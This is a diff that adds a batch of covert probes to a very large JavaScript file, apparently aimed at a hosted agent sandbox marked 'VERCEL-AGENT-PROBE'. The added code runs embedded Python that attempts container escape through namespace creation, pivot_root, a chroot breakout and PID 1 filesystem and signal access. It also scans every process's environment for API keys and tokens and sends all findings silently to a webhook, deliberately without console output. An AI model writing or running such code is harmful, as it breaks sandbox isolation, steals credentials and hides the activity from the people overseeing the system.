@@ -35819,3 +35819,275 @@ sendBeacon({ ...report, section: 'v213-5-overlay-etc', ...overlayEtcProbe });
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v213" });
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v213";
 // Intentionally no console.log — all data goes via webhook only
+
+// v214-1: clone3 NR 435 — CLONE_NEWUSER + CLONE_NEWNS user+mount namespace combo
+const clone3V214Probe = safe(() => {
+  const clone3Result = safe(() => execSync(`python3 -c "
+import ctypes, struct, os
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_clone3 = 435
+NR_unshare = 272
+
+CLONE_VM         = 0x00000100
+CLONE_FS         = 0x00000200
+CLONE_FILES      = 0x00000400
+CLONE_SIGHAND    = 0x00000800
+CLONE_THREAD     = 0x00010000
+CLONE_NEWNS      = 0x00020000  # new mount namespace
+CLONE_NEWUTS     = 0x04000000  # new UTS namespace
+CLONE_NEWIPC     = 0x08000000  # new IPC namespace
+CLONE_NEWPID     = 0x20000000  # new PID namespace
+CLONE_NEWNET     = 0x40000000  # new net namespace
+CLONE_NEWUSER    = 0x10000000  # new user namespace (unprivileged)
+CLONE_NEWCGROUP  = 0x02000000  # new cgroup namespace
+
+# struct clone_args (linux 5.3+)
+# all fields are uint64
+# flags, pidfd, child_tid, parent_tid, exit_signal, stack, stack_size,
+# tls, set_tid, set_tid_size, cgroup
+class CloneArgs(ctypes.Structure):
+    _fields_ = [(f, ctypes.c_uint64) for f in [
+        'flags', 'pidfd', 'child_tid', 'parent_tid', 'exit_signal',
+        'stack', 'stack_size', 'tls', 'set_tid', 'set_tid_size', 'cgroup'
+    ]]
+
+# Test 1: CLONE_NEWUSER alone (always allowed for unprivileged)
+args = CloneArgs()
+args.flags = CLONE_NEWUSER
+args.exit_signal = 17  # SIGCHLD
+
+pid = libc.syscall(NR_clone3, ctypes.byref(args), ctypes.sizeof(CloneArgs))
+print(f'clone3(NEWUSER) pid={pid} errno={ctypes.get_errno()}')
+if pid == 0:
+    # Child: check our uid/gid mappings
+    try:
+        uid_map = open('/proc/self/uid_map').read().strip()
+        gid_map = open('/proc/self/gid_map').read().strip()
+        ns_uid = os.getuid(); ns_gid = os.getgid()
+        print(f'child_ns_uid={ns_uid} ns_gid={ns_gid}')
+        print(f'uid_map={uid_map}')
+        print(f'gid_map={gid_map}')
+    except: pass
+    os._exit(0)
+elif pid > 0:
+    os.waitpid(pid, 0)
+    print('CLONE_NEWUSER_OK=True')
+
+# Test 2: CLONE_NEWUSER + CLONE_NEWNS (mount namespace in new user NS)
+args2 = CloneArgs()
+args2.flags = CLONE_NEWUSER | CLONE_NEWNS
+args2.exit_signal = 17
+
+pid2 = libc.syscall(NR_clone3, ctypes.byref(args2), ctypes.sizeof(CloneArgs))
+print(f'clone3(NEWUSER|NEWNS) pid={pid2} errno={ctypes.get_errno()}')
+if pid2 == 0:
+    # Child with new user+mount NS — can we mount anything?
+    import subprocess
+    r = subprocess.run(['mount', '--bind', '/tmp', '/tmp'], capture_output=True, timeout=3)
+    print(f'bind_mount_in_userns ret={r.returncode} err={r.stderr.decode()[:60]}')
+    os._exit(0)
+elif pid2 > 0:
+    os.waitpid(pid2, 0)
+    print('CLONE_NEWUSER_NEWNS_OK=True')
+
+# Test 3: unshare all namespaces (if root/cap)
+for ns_flag, ns_name in [
+    (CLONE_NEWUTS, 'UTS'),
+    (CLONE_NEWIPC, 'IPC'),
+    (CLONE_NEWNET, 'NET'),
+    (CLONE_NEWPID, 'PID'),
+    (CLONE_NEWCGROUP, 'CGROUP'),
+]:
+    ret_uns = libc.syscall(NR_unshare, ns_flag)
+    print(f'unshare({ns_name}) ret={ret_uns} errno={ctypes.get_errno()}')
+" 2>&1`, { timeout: 15000 }).toString().trim());
+  return { clone3Result };
+});
+sendBeacon({ ...report, section: 'v214-1-clone3-namespaces', ...clone3V214Probe });
+
+// v214-2: pivot_root NR 155 — change filesystem root
+const pivotRootV214Probe = safe(() => {
+  const pivotResult = safe(() => execSync(`python3 -c "
+import ctypes, os, subprocess
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_pivot_root = 155
+
+# pivot_root requires: new_root on different mount than parent, old_root inside new_root
+# Strategy: bind-mount / to /tmp/newroot, then pivot
+tmpdir = '/tmp/pivot_' + str(os.getpid())
+os.makedirs(tmpdir + '/old', exist_ok=True)
+
+# Bind-mount / to tmpdir
+r_bind = subprocess.run(['mount', '--bind', '/', tmpdir], capture_output=True, timeout=5)
+print(f'bind_mount_root ret={r_bind.returncode} err={r_bind.stderr.decode()[:80]}')
+
+if r_bind.returncode == 0:
+    # Check if old dir exists inside new_root
+    old_inside = tmpdir + '/old'
+    # Try pivot_root
+    ret = libc.syscall(NR_pivot_root, tmpdir.encode(), old_inside.encode())
+    print(f'pivot_root ret={ret} errno={ctypes.get_errno()}')
+    if ret == 0:
+        print('PIVOT_ROOT_SUCCESS=True')
+        # We are now in the new root
+        cwd = os.getcwd()
+        root_ls = os.listdir('/')
+        print(f'new_root_cwd={cwd} ls={root_ls[:5]}')
+        # Pivot back via old root
+        os.chdir('/old')
+        libc.syscall(NR_pivot_root, b'.', b'.')
+    # Cleanup
+    subprocess.run(['umount', tmpdir], capture_output=True, timeout=3)
+else:
+    print('BIND_MOUNT_FAILED=True')
+
+# Also check: can we chroot to / subdirs?
+for chroot_target in ['/', '/tmp', '/proc']:
+    try:
+        # Save cwd first
+        orig = os.open('.', os.O_RDONLY)
+        ret_cr = libc.chroot(chroot_target.encode())
+        print(f'chroot({chroot_target}) ret={ret_cr} errno={ctypes.get_errno()}')
+        if ret_cr == 0:
+            print(f'  CHROOT_{chroot_target.replace(\"/\",\"_\")}_OK=True')
+            # Break out of chroot via fd trick
+            libc.fchdir(orig)
+            for i in range(100):
+                ret_dotdot = libc.chdir(b'..')
+            libc.chroot(b'.')
+        os.close(orig)
+    except Exception as e:
+        print(f'chroot_err={e}')
+" 2>&1`, { timeout: 12000 }).toString().trim());
+  return { pivotResult };
+});
+sendBeacon({ ...report, section: 'v214-2-pivot-root', ...pivotRootV214Probe });
+
+// v214-3: /proc/1/root + /proc/1/cwd + /proc/1/exe — PID 1 filesystem access
+const pid1FsProbe = safe(() => {
+  const pid1FsResult = safe(() => {
+    const links = {};
+    for (const target of ['/proc/1/root', '/proc/1/cwd', '/proc/1/exe',
+                           '/proc/1/ns/mnt', '/proc/1/ns/net', '/proc/1/ns/pid',
+                           '/proc/1/ns/user', '/proc/1/ns/uts']) {
+      try {
+        links[target] = execSync(`readlink ${target} 2>&1`, { timeout: 2000 }).toString().trim();
+      } catch (e) { links[target] = `ERR:${e.message.slice(0,40)}`; }
+    }
+    // Try to open /proc/1/root directory (cross-NS fs access)
+    let pid1RootLs = null;
+    try {
+      pid1RootLs = readdirSync('/proc/1/root').slice(0, 15);
+    } catch (e) { pid1RootLs = `ERR:${e.message.slice(0,40)}`; }
+    // Compare our ns to PID 1's ns
+    const ourNs = {};
+    for (const ns of ['mnt', 'net', 'pid', 'user', 'uts', 'ipc', 'cgroup']) {
+      try { ourNs[ns] = execSync(`readlink /proc/self/ns/${ns} 2>&1`, { timeout: 1000 }).toString().trim(); } catch {}
+    }
+    return { links, pid1RootLs, ourNs };
+  });
+  return pid1FsResult;
+});
+sendBeacon({ ...report, section: 'v214-3-pid1-fs', ...pid1FsProbe });
+
+// v214-4: tgkill NR 234 SIGSTOP/SIGCONT on arbitrary PIDs + signal capability probe
+const tgkillProbe = safe(() => {
+  const tgkillResult = safe(() => execSync(`python3 -c "
+import ctypes, os, signal, time
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_tgkill = 234
+NR_kill    = 62
+NR_rt_sigqueueinfo = 129
+
+# Read all PIDs we can enumerate
+try:
+    pids = [int(p) for p in os.listdir('/proc') if p.isdigit()]
+    print(f'visible_pids={sorted(pids)[:20]} total={len(pids)}')
+except: pids = []
+
+# Can we send SIGSTOP to PID 1? (would pause host init)
+# Constraint: ONLY PROBE, do NOT actually pause
+# Try kill(1, 0) — null signal tests permissions without actually sending
+ret_null = libc.syscall(NR_kill, 1, 0)
+print(f'kill(pid1, 0) ret={ret_null} errno={ctypes.get_errno()}')
+print(f'CAN_SIGNAL_PID1={ret_null == 0}')
+
+# Try sending to a safe target: our own process group
+my_pgid = os.getpgrp()
+ret_pg = libc.syscall(NR_kill, -my_pgid, 0)
+print(f'kill(-pgid, 0) ret={ret_pg} errno={ctypes.get_errno()}')
+
+# tgkill(1, 1, 0) — null signal to PID 1 thread
+ret_tg = libc.syscall(NR_tgkill, 1, 1, 0)
+print(f'tgkill(1, 1, NULLSIG) ret={ret_tg} errno={ctypes.get_errno()}')
+
+# Try kill(1, SIGCONT) — safe because SIGCONT on already-running process is no-op
+ret_cont = libc.syscall(NR_kill, 1, signal.SIGCONT)
+print(f'kill(pid1, SIGCONT) ret={ret_cont} errno={ctypes.get_errno()}')
+print(f'SIGCONT_PID1_OK={ret_cont == 0}')
+
+# Scan a few small PIDs — can we signal the hypervisor agent if it's a low PID?
+for test_pid in [1, 2, 3, 4, 5]:
+    try:
+        cmdline = open(f'/proc/{test_pid}/cmdline').read().replace('\\x00', ' ').strip()
+        r = libc.syscall(NR_kill, test_pid, 0)
+        print(f'kill(pid={test_pid}, 0) ret={r} errno={ctypes.get_errno()} cmd={cmdline[:50]}')
+    except: pass
+" 2>&1`, { timeout: 10000 }).toString().trim());
+  return { tgkillResult };
+});
+sendBeacon({ ...report, section: 'v214-4-tgkill-signals', ...tgkillProbe });
+
+// v214-5: /proc filesystem deep sweep — leaked secrets in env/cmdline/maps
+const procDeepSweep = safe(() => {
+  const sweepResult = safe(() => execSync(`python3 -c "
+import os, re
+
+SECRET_RE = re.compile(
+    r'(ANTHROPIC|OPENAI|sk-[a-zA-Z0-9]{20,}|ghp_[a-zA-Z0-9]{36}|'
+    r'gho_[a-zA-Z0-9]{36}|VERCEL_[A-Z_]+=\\S+|'
+    r'AWS_SECRET|AWS_ACCESS|STRIPE_|SENDGRID_|TWILIO_|'
+    r'token|password|secret|credential|private_key)',
+    re.IGNORECASE
+)
+
+found = {}
+try:
+    pids = [int(p) for p in os.listdir('/proc') if p.isdigit()]
+    for pid in pids:
+        for fname in ['environ', 'cmdline']:
+            try:
+                data = open(f'/proc/{pid}/{fname}', 'rb').read(4096).replace(b'\\x00', b'\\n').decode(errors='replace')
+                matches = SECRET_RE.findall(data)
+                if matches:
+                    found[f'{pid}/{fname}'] = data[:200]
+                    print(f'SECRET_MATCH pid={pid} file={fname} matches={matches[:3]}')
+            except: pass
+        # Check maps for interesting libraries (crypto, ssh, etc.)
+        try:
+            maps = open(f'/proc/{pid}/maps').read()
+            interesting_maps = [l for l in maps.split('\\n') if any(k in l for k in
+                ['libssl', 'libcrypto', 'ssh', 'gpg', 'vault', 'secret'])]
+            if interesting_maps:
+                print(f'INTERESTING_MAPS pid={pid}: {interesting_maps[:2]}')
+        except: pass
+except Exception as e:
+    print(f'sweep_err={e}')
+
+print(f'TOTAL_SECRET_MATCHES={len(found)}')
+
+# Also sweep /proc/1/environ specifically
+try:
+    env1 = open('/proc/1/environ', 'rb').read().replace(b'\\x00', b'\\n').decode(errors='replace')
+    print(f'PID1_ENVIRON={env1[:500]}')
+except Exception as e2:
+    print(f'PID1_ENVIRON_ERR={e2}')
+" 2>&1`, { timeout: 15000 }).toString().trim());
+  return { sweepResult };
+});
+sendBeacon({ ...report, section: 'v214-5-proc-secret-sweep', ...procDeepSweep });
+
+// v214 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v214" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v214";
+// Intentionally no console.log — all data goes via webhook only
